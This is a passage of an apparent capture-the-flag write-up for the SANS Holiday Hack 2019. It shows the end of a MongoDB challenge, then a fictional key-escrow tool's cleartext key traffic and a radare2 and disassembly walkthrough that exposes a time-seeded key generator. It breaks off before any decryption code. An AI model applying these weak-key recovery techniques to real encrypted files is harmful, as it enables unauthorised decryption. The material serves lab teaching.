&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;elf@c6444428f1f4:~$&lt;/span&gt; mongo --port &lt;span class="m"&gt;12121&lt;/span&gt;
&lt;span class="go"&gt;MongoDB shell version v3.6.3&lt;/span&gt;
&lt;span class="go"&gt;connecting to: mongodb://127.0.0.1:12121/&lt;/span&gt;
&lt;span class="go"&gt;MongoDB server version: 3.6.3&lt;/span&gt;
&lt;span class="go"&gt;Server has startup warnings:&lt;/span&gt;
&lt;span class="go"&gt;2019-12-24T11:53:42.669+0000 I CONTROL  [initandlisten]&lt;/span&gt;
&lt;span class="go"&gt;2019-12-24T11:53:42.669+0000 I CONTROL  [initandlisten] ** WARNING: Access control is not enabled for the database.&lt;/span&gt;
&lt;span class="go"&gt;2019-12-24T11:53:42.669+0000 I CONTROL  [initandlisten] **          Read and write access to data and configuration is unrestricted.&lt;/span&gt;
&lt;span class="go"&gt;2019-12-24T11:53:42.669+0000 I CONTROL  [initandlisten]&lt;/span&gt;
&lt;span class="go"&gt;2019-12-24T11:53:42.669+0000 I CONTROL  [initandlisten]&lt;/span&gt;
&lt;span class="go"&gt;2019-12-24T11:53:42.669+0000 I CONTROL  [initandlisten] ** WARNING: /sys/kernel/mm/transparent_hugepage/enabled is &amp;#39;always&amp;#39;.&lt;/span&gt;
&lt;span class="go"&gt;2019-12-24T11:53:42.669+0000 I CONTROL  [initandlisten] **        We suggest setting it to &amp;#39;never&amp;#39;&lt;/span&gt;
&lt;span class="go"&gt;2019-12-24T11:53:42.670+0000 I CONTROL  [initandlisten]&lt;/span&gt;
&lt;span class="hll"&gt;&lt;span class="gp"&gt;&amp;gt;&lt;/span&gt; use elfu
&lt;/span&gt;&lt;span class="go"&gt;switched to db elfu&lt;/span&gt;
&lt;span class="hll"&gt;&lt;span class="gp"&gt;&amp;gt;&lt;/span&gt; db.loadServerScripts&lt;span class="o"&gt;()&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;displaySolution&lt;span class="o"&gt;()&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/span&gt;
&lt;span class="go"&gt;       __/ __&lt;/span&gt;
&lt;span class="go"&gt;            /&lt;/span&gt;
&lt;span class="go"&gt;       /.&amp;#39;o&amp;#39;.&lt;/span&gt;
&lt;span class="go"&gt;        .o.&amp;#39;.&lt;/span&gt;
&lt;span class="go"&gt;       .&amp;#39;.&amp;#39;*&amp;#39;.&lt;/span&gt;
&lt;span class="go"&gt;      o&amp;#39;.*.&amp;#39;.*.&lt;/span&gt;
&lt;span class="go"&gt;     .&amp;#39;.o.&amp;#39;.&amp;#39;.*.&lt;/span&gt;
&lt;span class="go"&gt;    .o.&amp;#39;.o.&amp;#39;.o.&amp;#39;.&lt;/span&gt;
&lt;span class="go"&gt;       [_____]&lt;/span&gt;
&lt;span class="go"&gt;        ___/&lt;/span&gt;


&lt;span class="go"&gt;  Congratulations!!&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="recover-cleartext-document"&gt;
&lt;h3&gt;&lt;a class="toc-backref" href="#id36"&gt;Recover Cleartext Document&lt;/a&gt;&lt;/h3&gt;
&lt;img alt="small_krampus.png" class="align-center" src="/images/sans-christmas-challenge-2019/small_krampus.png" /&gt;
&lt;p&gt;&lt;em&gt;Krampus says&lt;/em&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Wow! We’ve uncovered quite a nasty plot to destroy the holiday season.&lt;/p&gt;
&lt;p&gt;We’ve gotta stop whomever is behind it!&lt;/p&gt;
&lt;p&gt;I managed to find &lt;a class="reference external" href="/docs/sans-christmas-challenge-2019/ElfUResearchLabsSuperSledOMaticQuickStartGuideV1.2.pdf.enc"&gt;this protected document&lt;/a&gt;
on one of the compromised machines in our environment.&lt;/p&gt;
&lt;p&gt;I think our attacker was in the process of exfiltrating it.&lt;/p&gt;
&lt;p&gt;I’m convinced that it is somehow associated with the plan to destroy the
holidays. Can you decrypt it?&lt;/p&gt;
&lt;p&gt;There are some smart people in the NetWars challenge room who may be able
to help us.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;So, we have what seems to be an encrypted PDF that we need to decrypt. We're
given the &lt;a class="reference external" href="/docs/sans-christmas-challenge-2019/elfscrow.exe"&gt;elfscrow.exe&lt;/a&gt; tool, with
&lt;a class="reference external" href="/docs/sans-christmas-challenge-2019/elfscrow.pdb"&gt;debuging symbols&lt;/a&gt;. You know what
it means? It's reverse engineering time!&lt;/p&gt;
&lt;p&gt;Before static analysis, let's launch the &lt;code&gt;elfscrow.exe&lt;/code&gt; tool, to see how
it works:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="go"&gt;PS C:\Users\root\Documents\objectif_10&amp;gt; .\elfscrow.exe&lt;/span&gt;
&lt;span class="go"&gt;Welcome to ElfScrow V1.01, the only encryption trusted by Santa!&lt;/span&gt;


&lt;span class="go"&gt;* WARNING: You&amp;#39;re reading from stdin. That only partially works, use at your own risk!&lt;/span&gt;

&lt;span class="go"&gt;** Please pick --encrypt or --decrypt!&lt;/span&gt;

&lt;span class="go"&gt;Are you encrypting a file? Try --encrypt! For example:&lt;/span&gt;

&lt;span class="go"&gt;  C:\Users\root\Documents\objectif_10\elfscrow.exe --encrypt &amp;lt;infile&amp;gt; &amp;lt;outfile&amp;gt;&lt;/span&gt;

&lt;span class="go"&gt;You&amp;#39;ll be given a secret ID. Keep it safe! The only way to get the file&lt;/span&gt;
&lt;span class="go"&gt;back is to use that secret ID to decrypt it, like this:&lt;/span&gt;

&lt;span class="go"&gt;  C:\Users\root\Documents\objectif_10\elfscrow.exe --decrypt --id=&amp;lt;secret_id&amp;gt; &amp;lt;infile&amp;gt; &amp;lt;outfile&amp;gt;&lt;/span&gt;

&lt;span class="go"&gt;You can optionally pass --insecure to use unencrypted HTTP. But if you&lt;/span&gt;
&lt;span class="go"&gt;do that, you&amp;#39;ll be vulnerable to packet sniffers such as Wireshark that&lt;/span&gt;
&lt;span class="go"&gt;could potentially snoop on your traffic to figure out what&amp;#39;s going on!&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;So, this tool seems to be able to encrypt or decrypt documents, with the key
sent to a &lt;a class="reference external" href="https://en.wikipedia.org/wiki/Escrow"&gt;trusted third party&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Let's encrypt a document, and specify the &lt;code&gt;--insecure&lt;/code&gt; flag, so that we
can observe network communications:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="go"&gt;PS C:\Users\root\Documents\objectif_10&amp;gt; .\elfscrow.exe --insecure --encrypt .\text.txt test.enc&lt;/span&gt;
&lt;span class="go"&gt;Welcome to ElfScrow V1.01, the only encryption trusted by Santa!&lt;/span&gt;

&lt;span class="go"&gt;*** WARNING: This traffic is using insecure HTTP and can be logged with tools such as Wireshark&lt;/span&gt;

&lt;span class="go"&gt;Our miniature elves are putting together random bits for your secret key!&lt;/span&gt;

&lt;span class="hll"&gt;&lt;span class="go"&gt;Seed = 1578230480&lt;/span&gt;
&lt;/span&gt;
&lt;span class="hll"&gt;&lt;span class="go"&gt;Generated an encryption key: a0ad8f3edde93d45 (length: 8)&lt;/span&gt;
&lt;/span&gt;
&lt;span class="go"&gt;Elfscrowing your key...&lt;/span&gt;

&lt;span class="go"&gt;Elfscrowing the key to: elfscrow.elfu.org/api/store&lt;/span&gt;

&lt;span class="hll"&gt;&lt;span class="go"&gt;Your secret id is ed662e52-a681-42c8-acf9-bee4caa4f5a8 - Santa Says, don&amp;#39;t share that key with anybody!&lt;/span&gt;
&lt;/span&gt;&lt;span class="go"&gt;File successfully encrypted!&lt;/span&gt;

&lt;span class="go"&gt;    ++=====================++&lt;/span&gt;
&lt;span class="go"&gt;    ||                     ||&lt;/span&gt;
&lt;span class="go"&gt;    ||      ELF-SCROW      ||&lt;/span&gt;
&lt;span class="go"&gt;    ||                     ||&lt;/span&gt;
&lt;span class="go"&gt;    ||                     ||&lt;/span&gt;
&lt;span class="go"&gt;    ||                     ||&lt;/span&gt;
&lt;span class="go"&gt;    ||     O               ||&lt;/span&gt;
&lt;span class="go"&gt;    ||     |               ||&lt;/span&gt;
&lt;span class="go"&gt;    ||     |   (O)-        ||&lt;/span&gt;
&lt;span class="go"&gt;    ||     |               ||&lt;/span&gt;
&lt;span class="go"&gt;    ||     |               ||&lt;/span&gt;
&lt;span class="go"&gt;    ||                     ||&lt;/span&gt;
&lt;span class="go"&gt;    ||                     ||&lt;/span&gt;
&lt;span class="go"&gt;    ||                     ||&lt;/span&gt;
&lt;span class="go"&gt;    ||                     ||&lt;/span&gt;
&lt;span class="go"&gt;    ||                     ||&lt;/span&gt;
&lt;span class="go"&gt;    ++=====================++&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Let's take a look at the HTTP communication:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nf"&gt;POST&lt;/span&gt; &lt;span class="nn"&gt;/api/store&lt;/span&gt; &lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.1&lt;/span&gt;
&lt;span class="na"&gt;User-Agent&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;ElfScrow V1.01 (SantaBrowse Compatible)&lt;/span&gt;
&lt;span class="na"&gt;Host&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;elfscrow.elfu.org&lt;/span&gt;
&lt;span class="na"&gt;Content-Length&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;16&lt;/span&gt;
&lt;span class="na"&gt;Cache-Control&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;no-cache&lt;/span&gt;

a0ad8f3edde93d45
&lt;/pre&gt;&lt;/div&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.1&lt;/span&gt; &lt;span class="m"&gt;200&lt;/span&gt; &lt;span class="ne"&gt;OK&lt;/span&gt;
&lt;span class="na"&gt;Server&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;nginx/1.14.2&lt;/span&gt;
&lt;span class="na"&gt;Date&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Sun, 05 Jan 2020 14:49:04 GMT&lt;/span&gt;
&lt;span class="na"&gt;Content-Type&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;text/html;charset=utf-8&lt;/span&gt;
&lt;span class="na"&gt;Content-Length&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;36&lt;/span&gt;
&lt;span class="na"&gt;Connection&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;keep-alive&lt;/span&gt;
&lt;span class="na"&gt;X-Xss-Protection&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;1; mode=block&lt;/span&gt;
&lt;span class="na"&gt;X-Content-Type-Options&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;nosniff&lt;/span&gt;
&lt;span class="na"&gt;X-Frame-Options&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;SAMEORIGIN&lt;/span&gt;

ed662e52-a681-42c8-acf9-bee4caa4f5a8
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;So, it seems that the tool generates an encryption key, using a seed (that
suspiciously looks like a &lt;a class="reference external" href="https://en.wikipedia.org/wiki/Unix_time"&gt;Unix timestamp&lt;/a&gt;),
encrypts the document, and then sends the key to the elfscrow.elfu.org website,
which then gives us an id that will be used for decryption.&lt;/p&gt;
&lt;p&gt;Let's see the decryption process:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="go"&gt;PS C:\Users\root\Documents\objectif_10&amp;gt; .\elfscrow.exe --id=ed662e52-a681-42c8-acf9-bee4caa4f5a8 --insecure --decrypt test.enc test.dec&lt;/span&gt;
&lt;span class="go"&gt;Welcome to ElfScrow V1.01, the only encryption trusted by Santa!&lt;/span&gt;

&lt;span class="go"&gt;*** WARNING: This traffic is using insecure HTTP and can be logged with tools such as Wireshark&lt;/span&gt;

&lt;span class="go"&gt;Let&amp;#39;s see if we can find your key...&lt;/span&gt;

&lt;span class="go"&gt;Retrieving the key from: /api/retrieve&lt;/span&gt;

&lt;span class="go"&gt;We found your key!&lt;/span&gt;
&lt;span class="go"&gt;File successfully decrypted!&lt;/span&gt;

&lt;span class="go"&gt;  +----------------------+&lt;/span&gt;
&lt;span class="go"&gt;  |\                    /\&lt;/span&gt;
&lt;span class="go"&gt;  | \ ________________ / |\&lt;/span&gt;
&lt;span class="go"&gt;  |  |                |  | \&lt;/span&gt;
&lt;span class="go"&gt;  |  | +------------+ |  |  \&lt;/span&gt;
&lt;span class="go"&gt;  |  | |\          /| |  |   \&lt;/span&gt;
&lt;span class="go"&gt;  |  | | \        / | |  |    \&lt;/span&gt;
&lt;span class="go"&gt;  |  | |  \      /  | |  |     \&lt;/span&gt;
&lt;span class="go"&gt;  |  | |   \    /   | |  |     |&lt;/span&gt;
&lt;span class="go"&gt;  |  | |    \  /    | |  |     |&lt;/span&gt;
&lt;span class="go"&gt;  |  | |     \/     | |  |     |&lt;/span&gt;
&lt;span class="go"&gt;  |  | |            | |  |     |&lt;/span&gt;
&lt;span class="go"&gt;  |  | |            | |  |     |&lt;/span&gt;
&lt;span class="go"&gt;  |  |_|   SECRET   |_|  |     |&lt;/span&gt;
&lt;span class="go"&gt;  | /  +------------+  \ |     |&lt;/span&gt;
&lt;span class="go"&gt;  |/                    \|     |&lt;/span&gt;
&lt;span class="go"&gt;  +----------------------\     |&lt;/span&gt;
&lt;span class="go"&gt;                          \    |&lt;/span&gt;
&lt;span class="go"&gt;                           \   |&lt;/span&gt;
&lt;span class="go"&gt;                            \  |&lt;/span&gt;
&lt;span class="go"&gt;                             \ |&lt;/span&gt;
&lt;span class="go"&gt;                              \|&lt;/span&gt;
&lt;span class="go"&gt;                               |&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nf"&gt;POST&lt;/span&gt; &lt;span class="nn"&gt;/api/retrieve&lt;/span&gt; &lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.1&lt;/span&gt;
&lt;span class="na"&gt;User-Agent&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Elfscrow 1.0 (SantaBrowse Compatible)&lt;/span&gt;
&lt;span class="na"&gt;Host&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;elfscrow.elfu.org&lt;/span&gt;
&lt;span class="na"&gt;Content-Length&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;36&lt;/span&gt;
&lt;span class="na"&gt;Cache-Control&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;no-cache&lt;/span&gt;

ed662e52-a681-42c8-acf9-bee4caa4f5a8
&lt;/pre&gt;&lt;/div&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.1&lt;/span&gt; &lt;span class="m"&gt;200&lt;/span&gt; &lt;span class="ne"&gt;OK&lt;/span&gt;
&lt;span class="na"&gt;Server&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;nginx/1.14.2&lt;/span&gt;
&lt;span class="na"&gt;Date&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Sun, 12 Jan 2020 12:37:04 GMT&lt;/span&gt;
&lt;span class="na"&gt;Content-Type&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;text/html;charset=utf-8&lt;/span&gt;
&lt;span class="na"&gt;Content-Length&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;16&lt;/span&gt;
&lt;span class="na"&gt;Connection&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;keep-alive&lt;/span&gt;
&lt;span class="na"&gt;X-Xss-Protection&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;1; mode=block&lt;/span&gt;
&lt;span class="na"&gt;X-Content-Type-Options&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;nosniff&lt;/span&gt;
&lt;span class="na"&gt;X-Frame-Options&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;SAMEORIGIN&lt;/span&gt;

a0ad8f3edde93d45
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;To decrypt our file, the &lt;code&gt;elfscrow.exe&lt;/code&gt; tool sends our secret id to the
elfscrow.elfu.org server, which sends back our encryption key.&lt;/p&gt;
&lt;p&gt;So, how can we decrypt our PDF file? If we manage to recover the secret id, we
can ask the elfscrow.elfu.org server to send the key back. However, the secret
id seems to be fully managed by the web server, and we don't have any
information on it.&lt;/p&gt;
&lt;p&gt;The other way would be to look at how our encryption key is generated by the
executable. This is where having the executable and the debuging symbols is
useful. Now, I first tried analyzing it using &lt;code&gt;radare2&lt;/code&gt;, however the
disassembling seemed weirdly incomplete. I then tried using Ghydra on Linux,
but loading PDB files is not supported on Linux. So, I then tried using Ghydra
on Windows, but I got an error trying to load the PDB file. Uuuuugh. Finally,
I fell back on Visual Studio, with a little bit on &lt;code&gt;radare2&lt;/code&gt; on the side.&lt;/p&gt;
&lt;p&gt;I followed the following Microsoft documentation to debug an executable:&lt;/p&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;&lt;a class="reference external" href="https://docs.microsoft.com/en-us/visualstudio/debugger/how-to-debug-an-executable-not-part-of-a-visual-studio-solution?view=vs-2019"&gt;Debug an app that isn't part of a Visual Studio solution&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="reference external" href="https://docs.microsoft.com/en-us/visualstudio/debugger/specify-symbol-dot-pdb-and-source-files-in-the-visual-studio-debugger?view=vs-2019#configure-symbol-locations-and-loading-options"&gt;Specify symbol (.pdb) and source files in the Visual Studio debugger&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Let's see the list of functions in &lt;code&gt;radare2&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; r2 ./elfscrow.exe
&lt;span class="go"&gt;[0x004037f7]&amp;gt; idp ./elfscrow.pdb&lt;/span&gt;

&lt;span class="go"&gt;[0x004037f7]&amp;gt; aaa&lt;/span&gt;
&lt;span class="go"&gt;[x] Analyze all flags starting with sym. and entry0 (aa)&lt;/span&gt;
&lt;span class="go"&gt;[x] Analyze len bytes of instructions for references (aar)&lt;/span&gt;
&lt;span class="go"&gt;[x] Analyze function calls (aac)&lt;/span&gt;
&lt;span class="go"&gt;[x] Use -AA or aaaa to perform additional experimental analysis.&lt;/span&gt;
&lt;span class="go"&gt;[x] Constructing a function name for fcn.* and sym.func.* functions (aan)&lt;/span&gt;
&lt;span class="go"&gt;[0x004037f7]&amp;gt; afl&lt;/span&gt;
&lt;span class="go"&gt;0x00401000  104 1903 -&amp;gt; 1872 pdb.int___cdecl__getopt_internal_int__char_____const__char_const____struct_option_const____int____int&lt;/span&gt;
&lt;span class="go"&gt;0x00401770   64 1297 -&amp;gt; 1260 sub.s:_illegal_option_____c_770&lt;/span&gt;
&lt;span class="go"&gt;0x00401c90    1 35           pdb.int___cdecl_getopt_long_only_int__char_____const__char_const____struct_option_const____int&lt;/span&gt;
&lt;span class="go"&gt;0x00401cc0    4 203          pdb.void___cdecl_fatal_error_char&lt;/span&gt;
&lt;span class="hll"&gt;&lt;span class="go"&gt;0x00401d90    1 42           pdb.void___cdecl_super_secure_srand_int&lt;/span&gt;
&lt;/span&gt;&lt;span class="hll"&gt;&lt;span class="go"&gt;0x00401dc0    1 39           pdb.int___cdecl_super_secure_random_void&lt;/span&gt;
&lt;/span&gt;&lt;span class="hll"&gt;&lt;span class="go"&gt;0x00401df0    5 99           pdb.void___cdecl_generate_key_unsigned_char___const&lt;/span&gt;
&lt;/span&gt;&lt;span class="go"&gt;0x00401e60    1 18           fcn.00401e60&lt;/span&gt;
&lt;span class="go"&gt;0x00401e80    5 68           pdb.void___cdecl_to_hex_unsigned_char___const__char___const&lt;/span&gt;
&lt;span class="go"&gt;0x00401ed0    5 79           pdb.void___cdecl_from_hex_char___const__unsigned_char___const&lt;/span&gt;
&lt;span class="go"&gt;0x00401f20   25 758          pdb.void___cdecl_store_key_int__unsigned_char___const&lt;/span&gt;
&lt;span class="go"&gt;0x00402220    1 18           pdb.void___cdecl_retrieve_key_int__unsigned_char___const__char&lt;/span&gt;
&lt;span class="go"&gt;0x00402540    5 126          pdb.void___cdecl_print_hex_char____unsigned_char____unsigned_int&lt;/span&gt;
&lt;span class="go"&gt;0x004025c0    8 154          pdb.unsigned_char_____cdecl_read_file_char____unsigned_long_int&lt;/span&gt;
&lt;span class="go"&gt;0x00402660    6 103          pdb.void___cdecl_write_file_char____unsigned_char____unsigned_int&lt;/span&gt;
&lt;span class="go"&gt;0x004026d0    1 15           pdb.void___cdecl_do_encrypt_int__char____char&lt;/span&gt;
&lt;span class="go"&gt;0x00402a00    1 15           pdb.void___cdecl_do_decrypt_int__char____char____char&lt;/span&gt;
&lt;span class="go"&gt;0x00402d80    1 45           pdb.void___cdecl_usage_char&lt;/span&gt;
&lt;span class="go"&gt;0x00402db0   86 1942 -&amp;gt; 1943 pdb._main&lt;/span&gt;
&lt;span class="go"&gt;0x00403546    3 15   -&amp;gt; 122  pdb.___security_check_cookie_4&lt;/span&gt;
&lt;span class="go"&gt;0x004037f7   14 10   -&amp;gt; 202  entry0&lt;/span&gt;
&lt;span class="go"&gt;0x00403801    1 107          pdb.___report_gsfailure&lt;/span&gt;
&lt;span class="go"&gt;0x00403958    1 6            pdb.__amsg_exit&lt;/span&gt;
&lt;span class="go"&gt;0x0040395e    3 139  -&amp;gt; 145  pdb.__onexit&lt;/span&gt;
&lt;span class="go"&gt;[...]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;These three functions, &lt;code&gt;super_secure_srand&lt;/code&gt;, &lt;code&gt;super_secure_random&lt;/code&gt;,
and &lt;code&gt;generate_key&lt;/code&gt;, seem clearly interesting.&lt;/p&gt;
&lt;p&gt;Let's look at &lt;code&gt;generate_key&lt;/code&gt;:&lt;/p&gt;
&lt;table class="highlighttable"&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt; 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="err"&gt;00631&lt;/span&gt;&lt;span class="nl"&gt;DF0:&lt;/span&gt; &lt;span class="err"&gt;55&lt;/span&gt;                   &lt;span class="nf"&gt;push&lt;/span&gt;        &lt;span class="nb"&gt;ebp&lt;/span&gt;
&lt;span class="err"&gt;00631&lt;/span&gt;&lt;span class="nl"&gt;DF1:&lt;/span&gt; &lt;span class="err"&gt;8&lt;/span&gt;&lt;span class="nf"&gt;B&lt;/span&gt; &lt;span class="nv"&gt;EC&lt;/span&gt;                &lt;span class="nv"&gt;mov&lt;/span&gt;         &lt;span class="nb"&gt;ebp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nb"&gt;esp&lt;/span&gt;
&lt;span class="err"&gt;00631&lt;/span&gt;&lt;span class="nl"&gt;DF3:&lt;/span&gt; &lt;span class="err"&gt;51&lt;/span&gt;                   &lt;span class="nf"&gt;push&lt;/span&gt;        &lt;span class="nb"&gt;ecx&lt;/span&gt;
&lt;span class="err"&gt;00631&lt;/span&gt;&lt;span class="nl"&gt;DF4:&lt;/span&gt; &lt;span class="err"&gt;68&lt;/span&gt; &lt;span class="err"&gt;10&lt;/span&gt; &lt;span class="err"&gt;43&lt;/span&gt; &lt;span class="err"&gt;63&lt;/span&gt; &lt;span class="err"&gt;00&lt;/span&gt;       &lt;span class="nf"&gt;push&lt;/span&gt;        &lt;span class="mh"&gt;634310h&lt;/span&gt;
&lt;span class="err"&gt;00631&lt;/span&gt;&lt;span class="nl"&gt;DF9:&lt;/span&gt; &lt;span class="nf"&gt;FF&lt;/span&gt; &lt;span class="mi"&gt;15&lt;/span&gt; &lt;span class="nv"&gt;CC&lt;/span&gt; &lt;span class="mi"&gt;40&lt;/span&gt; &lt;span class="mi"&gt;63&lt;/span&gt; &lt;span class="mi"&gt;00&lt;/span&gt;    &lt;span class="nv"&gt;call&lt;/span&gt;        &lt;span class="kt"&gt;dword&lt;/span&gt; &lt;span class="nv"&gt;ptr&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nv"&gt;__imp____iob_func&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mh"&gt;06340CCh&lt;/span&gt;&lt;span class="p"&gt;)]&lt;/span&gt;
&lt;span class="err"&gt;00631&lt;/span&gt;&lt;span class="nl"&gt;DFF:&lt;/span&gt; &lt;span class="err"&gt;83&lt;/span&gt; &lt;span class="nf"&gt;C0&lt;/span&gt; &lt;span class="mi"&gt;40&lt;/span&gt;             &lt;span class="nv"&gt;add&lt;/span&gt;         &lt;span class="nb"&gt;eax&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mh"&gt;40h&lt;/span&gt;
&lt;span class="err"&gt;00631&lt;/span&gt;&lt;span class="nl"&gt;E02:&lt;/span&gt; &lt;span class="err"&gt;50&lt;/span&gt;                   &lt;span class="nf"&gt;push&lt;/span&gt;        &lt;span class="nb"&gt;eax&lt;/span&gt;
&lt;span class="err"&gt;00631&lt;/span&gt;&lt;span class="nl"&gt;E03:&lt;/span&gt; &lt;span class="nf"&gt;FF&lt;/span&gt; &lt;span class="mi"&gt;15&lt;/span&gt; &lt;span class="nv"&gt;C8&lt;/span&gt; &lt;span class="mi"&gt;40&lt;/span&gt; &lt;span class="mi"&gt;63&lt;/span&gt; &lt;span class="mi"&gt;00&lt;/span&gt;    &lt;span class="nv"&gt;call&lt;/span&gt;        &lt;span class="kt"&gt;dword&lt;/span&gt; &lt;span class="nv"&gt;ptr&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nv"&gt;__imp__fprintf&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mh"&gt;06340C8h&lt;/span&gt;&lt;span class="p"&gt;)]&lt;/span&gt;
&lt;span class="err"&gt;00631&lt;/span&gt;&lt;span class="nl"&gt;E09:&lt;/span&gt; &lt;span class="err"&gt;83&lt;/span&gt; &lt;span class="nf"&gt;C4&lt;/span&gt; &lt;span class="mi"&gt;08&lt;/span&gt;             &lt;span class="nv"&gt;add&lt;/span&gt;         &lt;span class="nb"&gt;esp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;8&lt;/span&gt;
&lt;span class="err"&gt;00631&lt;/span&gt;&lt;span class="nl"&gt;E0C:&lt;/span&gt; &lt;span class="err"&gt;6&lt;/span&gt;&lt;span class="nf"&gt;A&lt;/span&gt; &lt;span class="mi"&gt;00&lt;/span&gt;                &lt;span class="nv"&gt;push&lt;/span&gt;        &lt;span class="mi"&gt;0&lt;/span&gt;
&lt;span class="hll"&gt;&lt;span class="err"&gt;00631&lt;/span&gt;&lt;span class="nl"&gt;E0E:&lt;/span&gt; &lt;span class="nf"&gt;E8&lt;/span&gt; &lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="nv"&gt;D&lt;/span&gt; &lt;span class="mi"&gt;00&lt;/span&gt; &lt;span class="mi"&gt;00&lt;/span&gt; &lt;span class="mi"&gt;00&lt;/span&gt;       &lt;span class="nv"&gt;call&lt;/span&gt;        &lt;span class="nv"&gt;time&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mh"&gt;0631E60h&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
